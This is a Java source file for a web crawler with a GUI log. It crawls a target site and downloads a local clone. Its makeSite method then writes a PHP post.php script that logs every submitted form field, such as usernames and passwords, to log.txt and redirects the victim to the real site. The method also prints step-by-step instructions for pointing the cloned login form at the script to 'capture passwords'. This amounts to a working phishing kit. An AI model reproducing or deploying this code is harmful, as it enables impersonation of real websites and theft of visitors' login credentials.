import javax.swing.*;
import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashSet;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class WebCrawler {
    private ArrayList<String> internalLinks = new ArrayList<>();
    private ArrayList<String> externalLinks = new ArrayList<>();
    private String url;
    private String domain;
    private String siteName;
    private String nowCrawling;
    private boolean verbose;
    private boolean repeat;
    private JTextArea log = new JTextArea();
    private JTextArea resultLog = new JTextArea();

    public WebCrawler(String url) throws MyException {
        // Check Link
        String urlRegex = "^(http|https)://[-a-zA-Z0-9+&@#/%?=~_|,!:.;]*[-a-zA-Z0-9+@#/%=&_|]";
        Pattern pattern = Pattern.compile(urlRegex);
        Matcher m = pattern.matcher(url);
        if (!m.matches()) {
            throw new MyException("[ERROR] Link unreadable " + url);
        }

        // Set URL with / on the end
        if (url.charAt(url.length() - 1) != '/') url += "/";
        this.url = url;

        // Set Domain with Protocol
        this.domain = getDomain(url);

        // Set SiteName
        this.siteName = url.split("/")[2];
    }

    // Setters
    public void setVerbose(boolean verbose) {
        this.verbose = verbose;
    }
    public void setRepeat(boolean repeat) {
        this.repeat = repeat;
    }
    public void setLog(JTextArea log) {
        this.log = log;
    }
    public void setResultLog(JTextArea resultLog) {
        this.resultLog = resultLog;
    }

    // Getters
    public ArrayList<String> getInternalLinks() {
        return internalLinks;
    }
    public ArrayList<String> getExternalLinks() {
        return externalLinks;
    }
    public String getSiteName() {
        return siteName;
    }

    // Get Domain from URL
    private String getDomain(String url) {
        StringBuilder domain = new StringBuilder();
        int count = 0;
        for (int i = 0; i < url.length(); i++) {
            if (url.charAt(i) == '/') count++;
            if (url.charAt(i) == '/' && count == 3) {
                domain.append(url.charAt(i));
                break;
            }
            domain.append(url.charAt(i));
        }
        return domain.toString();
    }

    // Crawl, returns all found links
    private ArrayList<String> crawl(String url) {
        ArrayList<String> links = new ArrayList<>();
        try {
            Scanner sc = new Scanner(new URL(url).openStream());
            while (sc.hasNextLine()) {
                String line = sc.nextLine();
                if (line.contains("href=")) {
                    links.addAll(getLinks(line, "href=\""));
                }
                if (line.contains("src=")) {
                    links.addAll(getLinks(line, "src=\""));
                }
                if (line.contains("url(")) { ;
                    links.addAll(getLinks(line, "url\\("));
                }
            }
        } catch (IOException e) {
            if (verbose) {
                log.append("[ERROR] " + e.getMessage() + "\n");
                System.out.println("[ERROR] " + e.getMessage());
            }
        }
        return links;
    }

    // Main method, will use Crawl for all links found
    public void crawlLayers(int layers) {
        int startLayer = getLayer(url);
        int maxLayer = startLayer + layers;
        internalLinks.add(url);
        log.append("Crawling...\n\n");
        System.out.println("Crawling...\n");
        double progress = 0.0;
        int proCount = 1;
        int hundred = layers;
        if (repeat) hundred = layers * 2;
        log.append("[Progress] "+progress+"%\n");

        for (int i = 0; i < (repeat ? 2 : 1); i++) {
            for (int j = startLayer; j < maxLayer; j++) {
                ArrayList<String> links = new ArrayList<>();
                log.append("Layer: " + j + "\n");
                System.out.println("Layer: " + j);
                for (String link : internalLinks) {
                    if (getLayer(link) == j) {
                        if (verbose) {
                            log.append("[VERBOSE] " + link + "\n");
                            System.out.println("[VERBOSE] " + link);
                        }
                        nowCrawling = link;
                        links.addAll(crawl(link));
                    }
                }
                log.append("Links found: " + (links.size()) + "\n");
                System.out.println("Links found: " + (links.size()));
                progress = Math.floor(100.0/hundred*(proCount)*100)/100.0;
                if ((int)progress == 99) progress = 100;
                log.append("[Progress] " + progress + "%\n\n");
                System.out.println("[Progress] " + progress + "%\n");
                proCount++;

                LinkedHashSet<String> hashSet = new LinkedHashSet<>(links);
                links = new ArrayList<>(hashSet);
                links.forEach(link -> {
                    if (isInternal(link)) {
                        internalLinks.add(link);
                    } else {
                        externalLinks.add(link);
                    }
                });
            }
        }

        // Remove Doubles and Sort
        LinkedHashSet<String> hashSet = new LinkedHashSet<>(internalLinks);
        internalLinks = new ArrayList<>(hashSet);
        Collections.sort(internalLinks);
        hashSet = new LinkedHashSet<>(externalLinks);
        externalLinks = new ArrayList<>(hashSet);
        Collections.sort(externalLinks);

        int images = new Download().getImages(internalLinks).size();
        int videos = new Download().getVideos(internalLinks).size();
        String result = "+=+=+=+=+=+=+=+=+=+=+ Results =+=+=+=+=+=+=+=+=+=+=+" + "\n" +
                "+ Crawled:        " + url + "\n" +
                "+ Layers:         " + layers + "\n" +
                "+ Total Links:    " + (internalLinks.size() + externalLinks.size()) + "\n" +
                "+ Internal Links: " + internalLinks.size() + "\n" +
                "+ External Links: " + externalLinks.size() + "\n" +
                "+ Images:         " + images + "\n" +
                "+ Videos:         " + videos + "\n" +
                "+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=++=+=+=+=+";
        System.out.println(result);
        resultLog.append(result);
    }

    // Clone site from link array
    public void makeSite(ArrayList<String> links) {
        LinkedHashSet<String> hashSet = new LinkedHashSet<>(links);
        links = new ArrayList<>(hashSet);
        Collections.sort(links);
        log.append("\nCloning Site...\n");
        System.out.println("\nCloning Site...");
        for (String link : links) {
            Download download = new Download();
            try {
                URL url = new URL(link);
                String path = url.getPath();
                String dirname = url.getHost();

                int slashCount = path.split("/").length;
                int count = 0;
                StringBuilder newLink = new StringBuilder();
                for (int i = 0; i < path.length(); i++) {
                    newLink.append(path.charAt(i));
                    if (path.charAt(i) == '/') count++;
                    if (count == slashCount - 1 && path.charAt(i) == '/') break;
                }
                String dir = newLink.toString();
                String filePath = dirname + path;

                if (link.equals(getDomain(link))) {
                    filePath += "index.php";
                }

//                if (filePath.charAt(filePath.length()-1) == '/') {
//                    StringBuilder newFilePath = new StringBuilder();
//                    for (int i = 0; i < filePath.length() - 1; i++) {
//                        newFilePath.append(filePath.charAt(i));
//                    }
//                    filePath = newFilePath.toString();
//                }

                boolean hasExtension = false;
                ArrayList<String> extensions = new Download().getFileExtensions();
                for (String extension : extensions) {
                    if (filePath.contains(extension)) {
                        hasExtension = true;
                        break;
                    }
                }

                Files.createDirectories(new File(dirname + dir).toPath());
//                if (!hasExtension && Files.exists(Paths.get(filePath))) {
//                    filePath += ".html";
//                }
                download.download(link, filePath);
            } catch (IOException e) {
                if (verbose) {
                    log.append("[ERROR] " + e.getMessage() + "\n");
                    System.out.println("[ERROR] " + e.getMessage());
                }
            }
        }

        log.append("\nMaking post.php file to capture passwords...\n");
        System.out.println("\nMaking post.php file to capture passwords...\n");

        String linkDomain = url;
        try {
            linkDomain = new URL(url).getHost();
        } catch (MalformedURLException e) {
            System.out.println("[ERROR] " + e.getMessage());
        }

        System.out.print("post.php: ");
        ArrayList<String> post = new ArrayList<>();
        post.add("<? phpheader ('Location: https://"+linkDomain+"/');$handle = fopen(\"log.txt\", \"a\");foreach($_POST as $variable => $value) {fwrite($handle, $variable);fwrite($handle, \"=\");fwrite($handle, $value);fwrite($handle, \"\\r\\n\");}fwrite($handle, \"\\r\\n\\n\");fclose($handle);exit;?>");
        new Download().saveFile(post, linkDomain, "post.php");

        log.append("\nYou have to manually change the login form to redirect to the post.php file.\n");
        log.append("Usually there is a line with login_form and action=\"https://site.com/\" in the main html file\n");
        log.append("Just change the \"https://site.com/\" to \"post.php\" and you're ready to go.\n");

        System.out.println("You have to manually change the login form to redirect to the post.php file.");
        System.out.println("Usually there is a line with login_form and action=\"https://site.com/\" in the main html file");
        System.out.println("Just change the \"https://site.com/\" to \"post.php\" and you're ready to go.\n");

        if (!Files.exists(new File("index.php").toPath())) {
            final String[] htmlFile = {""};
            try {
                Files.list(new File(linkDomain).toPath()).forEach(file -> {
                    if (file.getFileName().toString().contains(".html")) {
                        htmlFile[0] = file.getFileName().toString();
                    }
                });
            } catch (IOException e) {
                System.out.println("[ERROR] " + e.getMessage());
            }

            post = new ArrayList<>();
            post.add("<meta http-equiv = \"refresh\" content = \"0; url = http://localhost/" + htmlFile[0] + "\" />");
            System.out.print("index.php: ");
            new Download().saveFile(post, linkDomain, "index.php");
            log.append("\n");
        }

        log.append("Done!\n");
        System.out.println("Done!");

        resultLog.append("\nSite Cloned!\n");
    }

    // Counts all slashes and determines the layer of a link
    private int getLayer(String url) {
        // Ignore the https:// slashes and count the other slashes to determine the layer
        int count = -2;
        for (int i = 0; i < url.length(); i++) {
            if (url.charAt(i) == '/') count++;
        }
        return count;
    }

    // Check to see if the link given is internal
    private boolean isInternal(String link) {
        StringBuilder domain2 = new StringBuilder();
        int count = 0;
        for (int i = 0; i < link.length(); i++) {
            if (link.charAt(i) == '/') count++;
            if (link.charAt(i) == '/' && count == 3) {
                domain2.append(link.charAt(i));
                break;
            }
            domain2.append(link.charAt(i));
        }
        return domain.equals(domain2.toString()) || link.contains(siteName);
    }

    // Crawl uses this to get all links from a line found
    private ArrayList<String> getLinks(String line, String regex) {
        ArrayList<String> links = new ArrayList<>();
        String end = "\"";
        if (regex.equals("url\\(")) end = "\\)";
        String[] linksSplit = line.split(regex);
        for (int i = 1; i < linksSplit.length; i++) {
            String link = linksSplit[i].split(end)[0];
            link = fixLink(link);
            if (!link.equals("null") && !links.contains(link) && canConnect(link))
            links.add(link);
        }
        return links;
    }

    // Reformat the link to make it readable
    private String fixLink(String link) {
        link = link.replace(" ", "");
        link = link.replace("'", "");
        link = link.replace("\"","");
        if (link.equals("")) link = "null";

        if (link.charAt(0) == '#' || (link.contains("/#")) || link.contains("data:")) {
            link = "null";
        }

        if (link.contains("../")) {
            StringBuilder newLink = new StringBuilder("/");
            for (int j = nowCrawling.split("/").length - 3; j > 2; j--) {
                newLink.append(nowCrawling.split("/")[nowCrawling.split("/").length - j]).append("/");
            }
            link = newLink + link.replace("../", "");
            System.out.println(link);
        }

        if (!link.equals("null") && !link.contains("://") && link.charAt(0) == '/') {
            StringBuilder newLink = new StringBuilder();
            for (int i = 1; i < link.length(); i++) {
                newLink.append(link.charAt(i));
            }
            link = newLink.toString();
        }

        if (!link.equals("null") && !link.contains("://")) link = domain + link;

        boolean hasDomain = false;
        ArrayList<String> domains = new Download().getDomains();
        for (String domain : domains) {
            if (link.contains(domain)) {
                hasDomain = true;
                break;
            }
        }
        if (!hasDomain) link = "null";

        return link;
    }

    // Check if link is readable
    private boolean canConnect(String link) {
        String urlRegex = "^(http|https)://[-a-zA-Z0-9+&@#/%?=~_|,!:.;]*[-a-zA-Z0-9+@#/%=&_|]";
        Pattern pattern = Pattern.compile(urlRegex);
        Matcher m = pattern.matcher(link);

        if (m.matches()) {
            // [SLOW] tryConnect(link);
            return true;
        } else {
            if (verbose) {
                log.append("[ERROR] " + link + "\n");
                System.out.println("[ERROR] " + link);
            }
        }
        return false;
    }

    // [Optional] Check if link is online (slow)
    private boolean tryConnect(String link) {
        try {
            URL myURL = new URL(link);
            HttpURLConnection myConnection = (HttpURLConnection) myURL.openConnection();
            if (myConnection.getResponseMessage().equals("OK")) return true;
        } catch (IOException e) {
            if (verbose) {
                log.append("[ERROR] " + link + "\n");
                System.out.println("[ERROR] " + link);
            }
            return false;
        }
        return false;
    }
}
